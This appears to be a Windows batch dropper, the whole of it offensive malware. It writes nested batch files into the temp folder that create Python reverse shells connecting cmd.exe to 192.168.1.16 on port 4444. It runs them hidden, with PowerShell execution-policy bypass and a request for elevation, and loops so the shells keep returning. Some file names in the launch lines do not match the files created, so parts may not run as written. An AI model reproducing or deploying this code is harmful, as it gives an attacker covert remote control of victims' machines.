@echo off
cd %temp%
if exist "%temp%\nihbtdtdow.bat" ^(
    powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process -FilePath '%temp%\nivbtdtdow.bat' -WindowStyle Hidden -Verb RunAs}"
^) else (
echo @echo off > nihbtdtdow.bat
echo cd %temp% >> nihbtdtdow.bat
echo :loop >> nihbtdtdow.bat
echo echo @echo off ^> pro1.bat^ >> nihbtdtdow.bat
echo echo del vb1.bat^ ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo :loop^ ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo if not exist "%%temp%%\sh1.py" ^^^(^ ^>^> pro1.bat^ >>nihbtdtdow.bat
echo echo     ^^(^ ^>^> pro1.bat^  >> nihbtdtdow.bat
echo echo            echo import socket^ ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo import os^ ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo import threading^ ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo import subprocess as sp^ ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo import time^ ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo def rev^^^^(^^^^): ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo    p = sp.Popen^^^^(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo    s = socket.socket^^^^(^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo    try^^^^: ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo        s.connect^^^^(^^^^('192.168.1.16', 4444^^^^)^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo    except ConnectionRefusedError as e^^^^: ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo        print^^^^('refused ... Check if listener is running.'^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo        return ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo.^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo    def s_o^^^^(^^^^): ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo        while True^^^^: ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo            try^^^^: ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                output = os.read^^^^(p.stdout.fileno^^^^(^^^^), 1024^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                if not output^^^^: ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                    break ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                s.sendall^^^^(output^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo            except Exception as e^^^^: ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                print^^^^("Error sending output:", e^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                break ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo    def r_i^^^^(^^^^): ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo        while True^^^^: ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo            try^^^^: ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                data = s.recv^^^^(1024^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                if not data^^^^: ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                    break ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                p.stdin.write^^^^(data^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                p.stdin.flush^^^^(^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo            except Exception as e^^^^: ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                print^^^^("Error receiving input:", e^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                break ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo    threading.Thread^^^^(target=s_o, daemon=True^^^^).start^^^^(^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo    threading.Thread^^^^(target=r_i, daemon=True^^^^).start^^^^(^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo    time.sleep^^^^(30^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo while True^^^^: ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo    rev^^^^(^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo    print^^^^("Loading ..."^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo        ) ^^^> %%temp%%\sh1.py^^ ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo    ) else ^( ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo    python3 %%temp%%\sh1.py ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo    timeout ^^/t 60 ^^^>^nul ^>^>^ pro1.bat^ >> nihbtdtdow.bat
echo echo    ) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo    goto loop ^>^> pro1.bat^ >> nihbtdtdow.bat

echo powershell -c "Start-Process -FilePath "%%temp%%\pro1.bat" -WindowStyle Hidden" >> nihbtdtdow.bat

@REM -----------------------------------------------------------------------------------------------------------------------------------------------------------------------

echo echo @echo off ^> pro.bat^ >> nihbtdtdow.bat
echo echo del vb1.bat^ ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo :loop^ ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo if not exist "%%temp%%\sh.py" ^^^(^ ^>^> pro.bat^ >>nihbtdtdow.bat
echo echo     ^^(^ ^>^> pro.bat^  >> nihbtdtdow.bat
echo echo            echo import socket^ ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo import os^ ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo import threading^ ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo import subprocess as sp^ ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo import time^ ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo def rev^^^^(^^^^): ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo    p = sp.Popen^^^^(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo    s = socket.socket^^^^(^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo    try^^^^: ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo        s.connect^^^^(^^^^('192.168.1.16', 4444^^^^)^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo    except ConnectionRefusedError as e^^^^: ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo        print^^^^('refused ... Check if listener is running.'^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo        return ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo.^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo    def s_o^^^^(^^^^): ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo        while True^^^^: ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo            try^^^^: ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                output = os.read^^^^(p.stdout.fileno^^^^(^^^^), 1024^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                if not output^^^^: ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                    break ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                s.sendall^^^^(output^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo            except Exception as e^^^^: ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                print^^^^("Error sending output:", e^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                break ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo    def r_i^^^^(^^^^): ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo        while True^^^^: ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo            try^^^^: ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                data = s.recv^^^^(1024^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                if not data^^^^: ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                    break ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                p.stdin.write^^^^(data^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                p.stdin.flush^^^^(^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo            except Exception as e^^^^: ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                print^^^^("Error receiving input:", e^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                break ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo    threading.Thread^^^^(target=s_o, daemon=True^^^^).start^^^^(^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo    threading.Thread^^^^(target=r_i, daemon=True^^^^).start^^^^(^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo    time.sleep^^^^(30^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo while True^^^^: ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo    rev^^^^(^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo    print^^^^("Loading ..."^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo        ) ^^^> %%temp%%\sh.py^^ ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo    ) else ^( ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo    python3 %%temp%%\sh.py ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo    timeout ^^/t 60 ^^^>^nul ^>^>^ pro.bat^ >> nihbtdtdow.bat
echo echo    ) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo    goto loop ^>^> pro.bat^ >> nihbtdtdow.bat

echo powershell -c "Start-Process -FilePath "%%temp%%\pro.bat" -WindowStyle Hidden" >> nihbtdtdow.bat
echo timeout ^/t 900 ^/nobreak ^>nul >> nihbtdtdow.bat
echo goto loop  >> nihbtdtdow.bat

powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process -FilePath '%temp%\nivbtdtdow.bat' -WindowStyle Hidden -Verb RunAs}"

^)

